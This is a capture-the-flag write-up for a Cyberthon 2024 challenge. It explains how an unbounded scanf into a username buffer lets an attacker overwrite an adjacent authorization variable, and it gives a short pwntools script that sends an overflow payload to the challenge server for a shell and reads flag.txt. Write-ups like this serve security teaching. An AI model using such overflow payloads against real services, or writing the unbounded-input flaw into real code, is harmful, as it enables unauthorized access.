# Authorization

## Problem Statement

Prove that you're authorized, and i'll give you a shell on my system.

Interact with the service at: `chals.t.cyberthon24.ctf.sg:33011`

Concept(s) Required:

- [Overwriting variables with Buffer Overflow](https://www.youtube.com/watch?v=T03idxny9jE)

Note: once you get a shell, the flag.txt can be found in the user's home directory.

## Solution

Let's take a look at the source code

```c
    char authorization[13] = "UNAUTHORIZED";
    char username[64];

    ...

    scanf("%s", username);

    printf("Greetings, %s. Your are %s.\n", username, authorization);

    if (!strcmp(authorization, "AUTHORIZED"))
    {
        puts("[ ACCESS GRANTED ]");
        shell();
    }
    else
    {
        puts("Intruder alert!");
    }
```

The vulnerability lies in the use of `scanf()` to read user input into the username buffer without specifying a maximum
length. This can lead to a buffer overflow, allowing us to overwrite the authorization variable and change its value
to "AUTHORIZED", thereby gaining access to the shell.

Essentially, we construct a username input that's long enough to overflow the username buffer and overwrite the authorization variable.

After some trial and error, you will see that you have to send 67 bytes of data before overriding the authorization variable

```python
from pwn import *

r = remote("chals.t.cyberthon24.ctf.sg", 33011)
r.sendlineafter(b'=> ', b'A' * 67 + b'AUTHORIZED')
r.sendline(b'cat ~/flag.txt')

r.interactive()
```
